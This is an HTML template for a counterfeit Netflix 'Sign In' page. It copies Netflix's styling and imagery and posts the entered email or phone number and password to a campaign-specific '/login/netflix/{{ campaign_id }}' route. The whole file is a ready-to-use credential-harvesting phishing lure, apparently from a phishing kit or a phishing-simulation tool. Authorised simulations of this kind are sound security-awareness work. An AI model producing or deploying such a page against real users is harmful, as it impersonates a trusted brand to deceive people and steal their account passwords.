<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Netflix</title>
    <style>
        body { font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; background: black; background-image: linear-gradient(rgba(0,0,0,0.5), rgba(0,0,0,0.5)), url('https://assets.nflxext.com/ffe/siteui/vlv3/f841d4c7-10e1-40af-bcae-07a3f8dc141a/f6d7434e-d6de-4185-a6d4-c77a2d087373/US-en-20220502-popsignuptwoweeks-perspective_alpha_website_small.jpg'); height: 100vh; margin: 0; display: flex; justify-content: center; align-items: center; }
        .login-box { background: rgba(0,0,0,0.75); padding: 60px; width: 400px; border-radius: 4px; box-sizing: border-box; color: white; }
        .login-box h1 { margin-bottom: 28px; }
        .login-box input { width: 100%; padding: 16px; margin: 10px 0; background: #333; border: none; border-radius: 4px; color: white; font-size: 16px; box-sizing: border-box; }
        .login-box button { width: 100%; padding: 16px; background: #e50914; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 24px; }
        .login-box button:hover { background: #f40612; }
    </style>
</head>
<body>
    <div class="login-box">
        <h1>Sign In</h1>
        <form action="/login/netflix/{{ campaign_id }}" method="POST">
            <input type="text" name="username" placeholder="Email or phone number" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Sign In</button>
        </form>
    </div>
</body>
</html>
